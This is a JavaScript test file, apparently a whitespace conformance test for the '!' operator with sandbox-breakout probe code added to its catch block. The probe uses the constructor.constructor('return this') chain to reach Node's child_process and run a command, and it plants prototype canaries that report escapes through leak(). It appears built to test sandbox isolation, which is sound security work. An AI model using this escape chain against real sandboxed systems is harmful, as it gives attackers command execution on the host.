try {
    if (eval('!\ttrue') !== false) {
        $ERROR('#true: !\\u0009true === false');
    }
    if (eval('!\x0Btrue') !== false) {
        $ERROR('#2: !\\u000Btrue === false');
    }
    if (eval('!\ftrue') !== false) {
        $ERROR('#3: !\\u000Ctrue === false');
    }
    if (eval('! true') !== false) {
        $ERROR('#4: !\\u0020 === false');
    }
    if (eval('!\xA0true') !== false) {
        $ERROR('#5: !\\u00A0true === false');
    }
    if (eval('!\ntrue') !== false) {
        $ERROR('#6: !\\u000Atrue === false');
    }
    if (eval('!\rtrue') !== false) {
        $ERROR('#7: !\\u000Dtrue === false');
    }
    if (eval('!\u2028true') !== false) {
        $ERROR('#8: !\\u2028true === false');
    }
    if (eval('!\u2029true') !== false) {
        $ERROR('#9: !\\u2029true === false');
    }
    if (eval('!\t\x0B\f \xA0\n\r\u2028\u2029true') !== false) {
        $ERROR('#10: !\\u0009\\u000B\\u000C\\u0020\\u00A0\\u000A\\u000D\\u2028\\u2029true === false');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}